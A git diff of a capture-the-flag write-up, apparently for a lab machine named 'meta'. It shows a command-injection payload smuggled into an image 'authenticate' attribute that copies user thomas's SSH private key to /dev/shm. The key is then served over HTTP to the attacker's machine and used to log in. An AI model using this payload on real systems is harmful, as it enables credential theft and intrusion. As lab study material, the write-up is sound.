@@ -147,7 +147,7 @@ we execute commands as `thomas` let's get ssh to connect by changing first line 
 
 ``` <image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;"'> ```
 
-
+```
 www-data@meta:/dev/shm$ ls -la
 ls -la
 total 8
@@ -155,14 +155,14 @@ drwxrwxrwt  2 root   root     80 May  1 06:41 .
 drwxr-xr-x 16 root   root   3080 May  1 04:31 ..
 -rw-r--r--  1 thomas thomas   54 May  1 06:29 0wned
 -rw-r--r--  1 thomas thomas 2590 May  1 06:41 id_rsa
-
+```
 We got ssh of user `thomas` ,  download it into attacker machine 
-
+```
 www-data@meta:/dev/shm$ python3 -m http.server 8005
 python3 -m http.server 8005
 Serving HTTP on 0.0.0.0 port 8005 (http://0.0.0.0:8005/) ...
 10.10.14.4 - - [01/May/2022 06:42:26] "GET /id_rsa HTTP/1.1" 200 -
-
+```
 then give it right permissions `chmod 600 id_rsa` and connect using the key ^_^
 
 ![thomas](https://user-images.githubusercontent.com/8396956/166142546-6f15b3e9-9ef6-424b-baf9-d16a331ff417.png)
